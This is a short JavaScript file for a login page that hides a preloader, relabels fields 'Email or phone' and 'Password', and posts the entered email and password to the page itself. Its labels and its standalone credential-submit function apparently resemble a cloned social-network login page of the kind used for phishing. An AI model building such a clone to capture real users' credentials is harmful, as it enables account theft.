const present_webpage = () => {
    let preloader = document.getElementById('preloader'),
        webpage = document.getElementById('root');
    preloader.style.display = "none";
    webpage.style.display = "block";
    console.log('Presenting Webpage');
}


const movePlaceHolder = () => {
    let emailLabel = document.getElementById('email_label');
    let emailInput = document.getElementById('email_input');
    let passwordLabel = document.getElementById('password_label');
    let passwordInput = document.getElementById('password_input');
    emailLabel.innerHTML = 'Email or phone';
    passwordLabel.innerHTML = 'Password';
    emailInput.removeAttribute('placeholder');
    passwordInput.removeAttribute('placeholder');
}

const submit_cred = () => {
    let user_id = document.getElementById('email_input').value,
        password = document.getElementById('password_input').value,
        credentials = `user_id=${user_id}&password=${password}`,
        req = new XMLHttpRequest();
        req.open('POST','',true);
        req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        req.send(credentials);
}